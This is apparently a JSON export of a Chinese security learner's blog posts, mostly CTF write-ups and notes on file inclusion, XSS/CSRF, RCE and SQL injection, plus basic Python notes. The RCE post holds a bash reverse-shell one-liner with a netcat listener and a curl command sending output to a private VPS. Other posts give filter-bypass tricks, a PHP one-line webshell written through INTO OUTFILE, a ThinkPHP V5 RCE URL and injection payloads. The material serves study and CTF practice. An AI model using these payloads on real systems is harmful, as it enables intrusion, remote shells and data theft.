[{"title":"Bugku never_give_up","url":"/2022/01/19/Bugku-never-give-up/","content":"\n# Bugku never_give_up\n\n查看源代码好的提示访问1p.html\n\n```html\n<HTML>\n<HEAD>\n    <SCRIPT LANGUAGE=\"Javascript\">\n    //\n\n\n    var Words = \"%3Cscript%3Ewindow.location.href%3D'http%3A%2F%2Fwww.bugku.com'%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E\"\n    function OutWord()\n    {\n        var NewWords;\n        NewWords = unescape(Words);\n        document.write(NewWords);\n    }\n    OutWord();\n    // -->\n    </script>\n</HEAD>\n<BODY></BODY>\n</HTML>\n\n\n```\n\n查看函数得知是将`Words`中的内容解码后执行\n\n经过URL解码与base64解码后hello.php的代码如下\n\n```php+HTML\n<script>window.location.href='http://www.bugku.com';</script> \n<!--\";if(!$_GET['id'])\n{\n\theader('Location: hello.php?id=1');\n\texit();\n}\n$id=$_GET['id'];\n$a=$_GET['a'];\n$b=$_GET['b'];\nif(stripos($a,'.'))\n{\n\techo 'no no no no no no no';\n\treturn ;\n}\n$data = @file_get_contents($a,'r');\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n{\n\t$flag = \"flag{***********}\"\n}\nelse\n{\n\tprint \"never never never give up !!!\";\n}\n?>-->\n```\n\n主要判断语句为：\n\n```php\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n```\n\ndata的数据来自file_get_contents函数，可以通过php伪协议中的php://input来伪造\n\nid==0为弱相等，而由于前面判断id所以id不能直接等于0，可以让id=%00，.，0e1，字母字符等绕过\n\nb长度大于5并且首位不为4，并且\"1114\"字符串中存在符合\"111\".substr($b,0,1)该规则的内容\n\n查询正则表达式的特殊字符得知，正则中的特殊字符如下\n\n|      | 特殊字符                                             |\n| ---- | ---------------------------------------------------- |\n| +    | 匹配前面的子表达式一次或多次                         |\n| .    | 匹配除换行符 \\n 之外的任何单字符                     |\n| *    | 匹配前面的子表达式零次或多次                         |\n| ?    | 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符 |\n|      |                                                      |\n\n所以让b字符串开头字符为上述任一字符就行\n\npayload：\n\n```\n?id=a&b=*12345&a=php://input\nbody:\nbugku is a nice plateform!\n```\n\n拿到flag\n\n![flag](/images/quiz/Bugku/never_give_up/flag.png)\n","tags":["CTF","web"]},{"title":"逻辑漏洞","url":"/2022/01/19/逻辑漏洞/","content":"\n# 逻辑漏洞\n\n1、密码找回，任意用户注册\n\n注册时抓包请求头内容，并且在得到返回链接时对比内容，找出编解码方式\n\n2、支付漏洞\n\n抓包修改付款金额\n\n3、越权\n\n通过直接更改URL中的请求值直接查看或更改他人数据\n\n4、\n","tags":["CTF","web"]},{"title":"攻防世界mfw","url":"/2022/01/19/攻防世界mfw/","content":"\n# 攻防世界mfw\n\n进入网页查看about内容，发现网页使用git进行版本管理\n\n![1](/images/quiz/XCTF/mfw/1.png)\n\n网站后加.git发现存在git泄漏![2](/images/quiz/XCTF/mfw/2.png)\n\n使用GitHack脚本获得源码\n\n```php\n<?php\n\nif (isset($_GET['page'])) {\n\t$page = $_GET['page'];\n} else {\n\t$page = \"home\";\n}\n\n$file = \"templates/\" . $page . \".php\";\n\n// I heard '..' is dangerous!\nassert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");\n\n// TODO: Make this look nice\nassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");\n\n?>\n<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<meta charset=\"utf-8\">\n\t\t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n\t\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n\t\t\n\t\t<title>My PHP Website</title>\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css\" />\n\t</head>\n\t<body>\n\t\t<nav class=\"navbar navbar-inverse navbar-fixed-top\">\n\t\t\t<div class=\"container\">\n\t\t    \t<div class=\"navbar-header\">\n\t\t    \t\t<button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#navbar\" aria-expanded=\"false\" aria-controls=\"navbar\">\n\t\t            \t<span class=\"sr-only\">Toggle navigation</span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t          \t</button>\n\t\t          \t<a class=\"navbar-brand\" href=\"#\">Project name</a>\n\t\t        </div>\n\t\t        <div id=\"navbar\" class=\"collapse navbar-collapse\">\n\t\t          \t<ul class=\"nav navbar-nav\">\n\t\t            \t<li <?php if ($page == \"home\") { ?>class=\"active\"<?php } ?>><a href=\"?page=home\">Home</a></li>\n\t\t            \t<li <?php if ($page == \"about\") { ?>class=\"active\"<?php } ?>><a href=\"?page=about\">About</a></li>\n\t\t            \t<li <?php if ($page == \"contact\") { ?>class=\"active\"<?php } ?>><a href=\"?page=contact\">Contact</a></li>\n\t\t\t\t\t\t<!--<li <?php if ($page == \"flag\") { ?>class=\"active\"<?php } ?>><a href=\"?page=flag\">My secrets</a></li> -->\n\t\t          \t</ul>\n\t\t        </div>\n\t\t    </div>\n\t\t</nav>\n\t\t\n\t\t<div class=\"container\" style=\"margin-top: 50px\">\n\t\t\t<?php\n\t\t\t\trequire_once $file;\n\t\t\t?>\n\t\t\t\n\t\t</div>\n\t\t\n\t\t<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js\" />\n\t\t<script src=\"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js\" />\n\t</body>\n</html>\n\n```\n\nassert()函数将内容当作php命令执行，strpos()函数查找字符串1中字符串2首次出现的位置，尝试通过闭合构造命令\n\n```php\nassert(\"strpos('$file', '..') === false\")\n```\n\n首先使用')闭合strpos函数而后输入.命令拼接字符串，最后加入//注释后面内容\n\n完整payload：\n\n```\n?page=').phpinfo();//\n```\n\n传入后原函数变为\n\n```php\nassert(\"strpos('').phpinfo();//', '..') === false\")\n```\n\n执行成功\n\n![3](/images/quiz/XCTF/mfw/3.png)\n\n随后通过system()函数得到flag\n\n![4](/images/quiz/XCTF/mfw/4.png)\n","tags":["CTF","web"]},{"title":"文件包含","url":"/2022/01/18/文件包含/","content":"\n# 文件包含\n\n常见的文件包含漏洞函数：include()，require()\n\n### 本地包含\n\n#### 利用方式：\n\n###### 1、php://input：\n\n```\n?file=php://input\n请求体内为PHP代码：<?php phpinfo(); ?>\n```\n\nphp://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input，同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n\n遇到file_get_contents()要想到用php://input绕过。\n\n###### 2、php://filter：\n\n```\n?file=php://filter/rescource=xxx.php\n以base64编码读取\n?file=php://filter/read=convert.base64-encode/resource=xxx.php\n```\n\nphp://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。\n\n###### 3、zip://：\n\n```\n?file=zip://[压缩包绝对路径]#[压缩包内文件]\n```\n\nzip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。\n\n- zip://中只能传入绝对路径。\n- 要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23\n- 只需要是zip的压缩包即可，后缀名可以任意更改。\n- 相同的类型的还有zlib://和bzip2://\n\n###### 4、data://：\n\n```\n?file=data://[<MIME-type>][;cherset=<encoding>][;base64],<data>\n下面为示例\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=\n```\n\ndata:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。\n\n###### 5、phar//：\n\n```\n?file=phar://压缩包路径（相对绝对都可）/压缩包内文件\n```\n\n需要phar://有点类似zip://同样可以导致任意代码执行。\n\n#### 可供包含的内容：\n\n###### 1、包含Apache日志文件：\n\n###### **条件：对日志文件可读并且知道日志文件的存储目录**\n\n**注意事项：**一般情况下日志存储目录被修改，需要读取服务器配置文件（httpd，conf，nginx，conf...）或者根据phpinfo()中的信息来得知。还有就是日志记录的信息都可以被调整，比如记录报错的等级或者内容格式。\n\nApache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。\n\n如果访问一个不存在的资源时，如http://www.xxxx.com/<?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<?php phpinfo(); ?> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。\n\n###### 2、包含SESSION\n\n**条件：**找到Session内的可控变量，并且Session文件可读写，并且知道存储路径，PHP中SESSION文件保存路径可以在phpinfo中看到\n\n**常见路径：**\n\n/var/lib/php/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\nsession文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。\n\n\n###### 3、包含/pros/self/environ\n\n**内容：**proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。\n\n**条件：**php以cgi方式运行，这样environ才会保持UA头。environ文件存储位置已知，且environ文件可读。\n\n###### 4、包含临时文件\n\nphp中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\Winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。\n\n由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。\n\n另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。\n","tags":["CTF","web"]},{"title":"XSS","url":"/2022/01/13/XSS注入/","content":"\n# XSS\n\n#### 内容：\n\n全称为跨站脚本攻击，是一种Web应用程序的漏洞，来自用户的不可信数据在没有验证的情况下被应用程序进行了处理，没有正确转义（escape）或编码（encode）反射回浏览器，导致浏览器引擎执行了非预期代码\n\n#### 类型：\n\n###### 反射性：直接传输代码后，经过后端渲染代码直接放入了前端页面中\n\n###### 存储型：将代码经过后端处理存入数据库，当从数据库查询经前端渲染后代码被执行\n\n###### DOM型：不需要以来服务端相应内容，如果HTML页面中使用了document.location等DOM元素的属性，攻击者就可以利用这些属性注入恶意脚本实施基于DOM的跨站脚本攻击\n\n#### DOM：\n\nDocument Object Model（文档对象模型），通过HTLM DOM，树中所有节点都可通过JavaScript进行访问，修改，创建，删除\n\n![DOM示意](/images/DOM示意.png)\n\nXSS盲打：\n\n构架script标签使受害者执行，通过document.location和document.cookie获取到受害者的cookie及管理页面等隐私内容导致网站内容泄漏\n\n#### CSRF：\n\n跨站请求伪造\n\n攻击流程：通过获取受害的Cookie等信息，伪造对应用户的请求头，通过用户身份![CSRF](/images/CSRF.jpg)\n\n使用方法：制作网站时可通过构造img标签直接访问，如\n\n```html\n<img src=\"http://www.myBank.com/Transfer.php?toBankId=1111&money=1000\">\n```\n\n或者通过JavaScript构造post请求并通过dom元素直接提交，如\n\n```html\n<html>\n　　<head>\n　　　　<script type=\"text/javascript\">\n　　　　　　function steal()\n　　　　　　{\n          　　　　 iframe = document.frames[\"steal\"];\n　　     　　      iframe.document.Submit(\"transfer\");\n　　　　　　}\n　　　　</script>\n　　</head>\n\n　　<body onload=\"steal()\">//页面完全载入后触发\n　　　　<iframe name=\"steal\" display=\"none\">\n　　　　　　<form method=\"POST\" name=\"transfer\"　action=\"http://www.myBank.com/Transfer.php\">\n　　　　　　　　<input type=\"hidden\" name=\"toBankId\" value=\"11\">\n　　　　　　　　<input type=\"hidden\" name=\"money\" value=\"1000\">\n　　　　　　</form>\n　　　　</iframe>\n　　</body>\n</html>\n```\n\n或者完全伪造原表单，并且填写好内容，通过javascript直接提交\n\n```html\n<body>\n    <form method=\"post\" action=\"money.php\" id=\"mon\">\n        用户名：<input type=\"text\" name=\"user\" id=\"user\" value=\"Jlan\">\n        转账人：<input type=\"money\" name=\"money\" id=\"pass\" value=\"100000\">\n    </form>\n    <script>\n        document.getElementById(\"mon\").submit()\n    </script>\n</body>\n```\n\n#### SSRF：\n\n服务端请求伪造\n\n攻击流程：通过页面中可访问其他页面的位置通过服务端发起请求进而获取到客户端无法访问的内部系统\n\n攻击位置：有在线翻译，页面收藏，图片加载下载等\n","tags":["CTF","web"]},{"title":"Python面向对象","url":"/2022/01/11/Python面向对象/","content":"\n# Python面向对象\n\n#### 类的定义：\n\n```python\n#object是所有类的基类\n#每个对象会保存自己的属性，不同对象间属性没有必然联系\n#类内部可通过self操作\nclass 类名(object):\n  def 函数名(self):\n    方法内容\n\t\n```\n\n#### 类外操作对象属性：\n\n```python\n对象名.属性名=属性内容#给类添加或修改属性\n```\n\n#### 魔法方法：\n\n这类方法以双下划线开头和结尾，在满足某种特定条件是会调用这种方法\n\n```python\n#创建对象后会立即调用\n#使用时类似构造函数\n__init__(self,参数1,参数2)\n```\n\n```python\n#该方法返回值为字符串，在使用print(对象)时会自动调用\n#进行强制类型转换时也会自动调用\n__str__(self)\n```\n\n```python\n#对象在内存中被销毁时会调用\n#使用时类似析构函数，可使用del 变量名进行销毁\n__del__(self)\n```\n\n","tags":["Note","Python"]},{"title":"Python基础","url":"/2022/01/11/Python基础/","content":"\n# Python基础\n\n#### 数据类型：\n\nstring（字符串）\n\nnum（数字）\n\nbool（布尔）\n\nlist（列表）使用[    ]定义\n\ntuple（元组）使用{     }定义（无序）\n\ndictionary（字典）使用{     }定义，内容为：下标名:元素内容\n\n\n\n#### 字符串相关函数：\n\n###### 查找：\n\n```python\nstr.find(str1,start,end)//rfind从末尾开始查找\nstr.index(str1,start,end)//rindex从末尾开始查找\n```\n\n在字符串中查找是否存在str1，存在返回第一次出现的位置，不存在find返回-1，index报错\n\n```python\nstr.count(str1,start,end)\n```\n\n查找字符串中某字符串出现的次数\n\n###### 替换：\n\n```python\nstr.replace(old,new,count)\n```\n\n将字符串中old内容替换为new，count为最大替换次数，返回新字符串，不改变原来字符串\n\n###### 切割：\n\n```python\nstr.split(str1,count)\n```\n\n将字符串以str1为分隔切割，count为最大切割次数，返回一个列表，不改变原有字符串，默认按空白字符进行全切割\n\n###### 加入：\n\n```python\nstr.join(可迭代对象)\n```\n\n将str插入到可迭代对象两个元素之间，返回一个字符串\n\n###### 乱七八糟：\n\n```python\ncapitalize(str)//将字符串中第一个字母大写\ntitle(str)//字符串中每个单词首字母大写\nstr.startwith(str1)//检查字符串是否以str1开头\nstr.endwith(str1)//检查字符串是否以str1结尾\nstr.upper()//字母全大写\nstr.lower()//字母全小写\n```\n\n\n\n\n\ninput输入\n\nprint输出\n\nread读文件（按字节读），readline（按行读）\n\nopen(\"文件名\"，\"打开方式（r只读，w写入，a追加，（b）代表以二进制打开，（+）代表读写）\"，encoding=\"编码方式\")打开文件（以二进制进行读写时不能指定encoding方式）\n\n*args不定长参数，接收后生成元组\n\n**kwargs不定长参数，接收后生成字典\n\n#### Python内存管理机制：引用计数\n\n```python\na=1 #a地址引用为1\nb=a #a地址引用为2\ndel a #a地址引用为1\ndel b #a地址引用为0，此时a引用地址被销毁\n```\n\n","tags":["Python"]},{"title":"CTFShow 爆破web25","url":"/2022/01/08/CTFShow 爆破web25/","content":"\n# CTFShow 爆破web25\n\n首先查看代码\n\n```php\n<?php\nerror_reporting(0);\ninclude(\"flag.php\");\nif(isset($_GET['r'])){\n    $r = $_GET['r'];\n    mt_srand(hexdec(substr(md5($flag), 0,8)));\n    $rand = intval($r)-intval(mt_rand());\n    if((!$rand)){\n        if($_COOKIE['token']==(mt_rand()+mt_rand())){\n            echo $flag;\n        }\n    }else{\n        echo $rand;\n    }\n}else{\n    highlight_file(__FILE__);\n    echo system('cat /proc/version');\n}\n?>\n```\n\n发现传入值有r，cookie需要进行伪造，先随便传入一个r，发现多次刷新后显示的值相同，说明随机数生成的结果相同，都是949254252\n\n![1](/images/quiz/CTFShow/web25/1.png)\n\n查询后得知\n\n```\nmt_srand()//以传入变量作为种子分发\nmt_rand()//以种子生成随机数\n```\n\n由于每次的seed相同，所以生成的随机数相同，尝试构造payload\n\n```\n?r=949254252 Cookie: token=1898508504\n```\n\n![2](/images/quiz/CTFShow/web25/2.png)\n\n结果发现失败，查看提示，发现是在多次掉用mt_rand()时生成的随机数与种子有关但并不相等，所以不能简单用token=2*mt_rand()解决，使用提示中给出的脚本计算出seed，放入PHP环境中实验\n","tags":["CTF","web"]},{"title":"模版漏洞","url":"/2022/01/08/模版漏洞/","content":"\n# 模版漏洞\n\n### ThinkPHP V5漏洞：\n\n```url\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=PHP函数名&vars[1][]=PHP函数参数1&vars[1][]=PHP函数参数2\n```\n\n该漏洞可用于执行PHP函数\n\n","tags":["CTF","web","Note"]},{"title":"RCE远程代码执行","url":"/2022/01/08/RCE远程代码执行/","content":"\n# **RCE远程代码执行**\n\n#### **一、RCE能做到什么：**\n\n1、执行系统命令 2、记录用户输入 3、控制键盘鼠标 4、任意上传下载 5、截屏\n\n#### **二、RCE产生原因：**\n\n1、服务器上有木马 \n\n2、脆弱服务未授权\n\n3、通过数据库写木马 \n\n4、文件上传/文件包含 \n\n5、危险函数（eval，assert，system，shell_exec，exec，file_put_contents） \n\n6、命令执行 \n\n7、反序列化\n\n#### **三、RCE远程代码执行关键点：**\n\n##### **1、RCE黑名单过滤：**\n\nlinux执行命令特殊字符：（;分割命令）（&&在前一个命令执行成功的前提下执行后面命令）（||前一个命令执行失败的前提下执行后面命令）（|将前面命令执行的结果作为输入，输入到后面命令中执行）（``将命令执行结果作为命令再次执行）（$()和前一个一样）\n\n过滤空格后可使用<向命令传入参数，${IFS}为空格，%0a为分号转译\n\n##### **2、RCE无回显：**\n\n（1）、反弹shell：攻击端监听一个端口如：2333 \n\n​\t攻击端使用：\n\n```shell\nnc -lvp 监听的端口\n```\n\n​\t受害端使用如下命令生成一个反弹shell：\n\n```shell\nbash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\n```\n\n​\t在攻击端终端即可在受害端中执行命令\n\n（2）、dnslog：通过ping $(命令).域名 通过这种方式获取命令执行结果\n\n（3）、写文件：将命令执行结果写入到文件中，使用echo命令：\n\n```shell\necho \"写入内容\">test.txt\n```\n\n（4）、curl等网络命令：通过POST等方式直接给到个人私有VPS中\n\n```shell\ncurl -d \"key1=value1&key2=value2&key3=value3\" protocol://ip:port/path\n```\n\n##### **3、RCE后发现不出网**\n\n（1）、写文件\n\n（2）、命令盲注：命令||sleep 100\n\n（3）、隐蔽信道\n\n##### 4、字符绕过\n\n（1）、\n\n```\n使用''或\"\"隔断字符串\n```\n\n（2）、空格可使用：<，<>，${IFS}，$IFS，%20(space)，%09(tab)，$IFS$9，$IFS$1 替换\n\n（3）、分号可使用：%0a，%0d，%0D，%0A 替换\n\n（4）、使用base64编码：Y2F0IGZsYWcucGhw|base64，将其中内容解码后执行\n\n（5）、使用`反引号包裹命令，将其中内容作为前一命令的输入\n","tags":["web","Note","RCE"]},{"title":"SQL注入笔记","url":"/2022/01/08/SQL注入笔记/","content":"\n# **SQL注入**\n\n1、通过order by爆出字段数\n\n2、union操作，联合查询，查询的是在同一个数据表的数据，通过union select 1,2,3…,n来判断回显位置\n\n3、information_schema数据库，为mysql自带数据库，提供数据库源数据访问，最常用的是\n\n**TABLES表**：提供了关于数据库中表的信息\n\n**COLUMNS表**：提供了表中列的信息\n\n爆破库名：\n\n```mysql\nunion select 1,2,database()\n//靠错误爆出库名\nand exists(select * from aaa)\n//aaa表并不存在，此时会报错停止并返回数据库名.aaa\n```\n\n爆破表名：\n\n```mysql\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\nand exists(select * from 表名)//爆破出表名\n```\n\n爆破列名：\n\n```mysql\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"想查询的表名\"\nand exists(select 列名 from 已知表名)//爆破出列名\n```\n\n4、报错注入\n\n（1）updatexml：更新XML文档的函数\n\n语法：**updatexml（文档类型，xpath路径，更新的内容）**\n\n例子：\n\n```mysql\nand updatexml(0x0a,concat(0x0a,(select database())),’1’)\n```\n\n0x0a代表换行符，concat拼接\n\n拼接目的为使得查询结果能完全显示出来\n\n（2）extractvalue：对XML文档进行查询的函数\n\n语法：**extractvalue（文档类型，xpath路径）**\n\n报错原理：路径中写入不合法的格式，就会报错并且返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容\n\n```mysql\nand (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))\n```\n\n提示：报错最长显示30个字符内容，如果内容过长可使用substr函数进行拆分\n\n​\t例题：CTFHub技能树web-SQL注入-报错注入\n\n​\t![SQLError](/images/quiz/SQLError.png)\n\n​\t首先爆破库表列名\n\n​\t![SQLError2](/images/quiz/SQLError2.png)\n\n​\t进而发现flag过长用substr切割\n\n​\t![SQLError3](/images/quiz/SQLError3.png)\n\n​\t得到flag\n\n5、盲注：\n\n布尔盲注：回显只有两种情况，一种有一种无\n\nif表达式：if(expr1,expr2,expr3)\n\nexpr1为真就返回expr2（可用于执行函数）\n\nsubstr函数：substr(字符串,起始位置,截取长度)\n\nascii函数：将函数内字符以ascii表转换为数字，而后可以进行判断\n\n\n\n时间盲注：无回显，可以通过sleep函数判断是否为时间盲注\n\n~~建议直接sqlmap~~\n\n（1）、sleep函数看延迟时间\n\n（2）、benchmark(执行次数,方式)，执行超多次看延迟时间\n\n6、堆叠注入：通过语句分割符号（  ;  ）分隔多条语句，直接将想要的数据插入到表中，然后再通过查询语句读取\n\n7、mysql文件读写：读取：load_file函数：load_file(‘文件路径’)\n\n写入：\n\n```mysql\nselect ‘<?php eval($_POST[cmd]);?>’ into outfile或dumpfile '绝对路径';//建议用dumpfile，因为outfile会在文件末行写入新行，使用的转译换行符，会破坏文件完整性，可能导致一句话木马无法执行\n```\n\n8、关键词绕过：通过\n\n（1）、set@a：设定一个语句变量 set@sql=0x16进制数\n\n（2）、prepare : 存储一个sql语句 存到execsql 里面 prepare execsql from @sql\n\n（3）、execute :执行一个sql语句 execute execsql\n\n由于设定语句变量时，mysql会自动将16进制数据转换为文字\n\n9、零碎\n\n```mysql\nto_base64(内容)//该语句将内容经过base64编码后输出\nreplace(ori,old,new)\n```\n\n```\n%0a,/**/可代替空格\n```\n\n```\n--+，%23，#将后面的语句注释\n```\n\n","tags":["web","Note","SQL"]},{"title":"CTF零碎笔记","url":"/2022/01/08/CTF零碎笔记/","content":"\n# 零碎笔记\n\nmt_srand( )该函数在PHP4.2.0之前传入任意参数后生成的都是伪随机数，在任何机器上只要运行的同样的seed参数结果都相同\n\n\n\nKindEditor编辑器漏洞，在使用该编辑器是在url末尾加上/php/file_manager_json.php?path=路径，就会便利路径中所有内容，特征为前端代码中有对php/file_manager_json.php的引用\n\n## 序列化与反序列化：\n\n#### 序列化：\n\n将一个对象转化为一个有序的字符串\n\n#### 序列化格式：\n\n结构类型:\n\n```php\n对象名长度:\"对象名\":类中项目数量:{项目1类型:项目1长度:”项目1内容”;项目2类型:项目2长度:”项目2内容”;} \n```\n\n例子：\n\n```php\nO:4:\"xctf\":2:{s:4:\"flag\";s:3:\"111\";}\n//O代表对象类型，s代表字符串类型\n```\n\n#### 序列化有关函数：\n\n```php\nserialize(对象)//将对象进行序列化，返回一个字符串\n```\n\n```php\nunserialize(字符串)//将对应字符串进行反序列化操作，返回一个类\n```\n\n```php\n__wakeup()//该函数为类内函数，如果序列化中对象属性个数的值大于真是个数时就会跳过该函数执行\t\n```\n\n","tags":["web","Note"]},{"title":"CTF","url":"/2022/01/08/CTF/","content":"\nJlan的CTF之旅从现在开始了\n","tags":["Note"]}]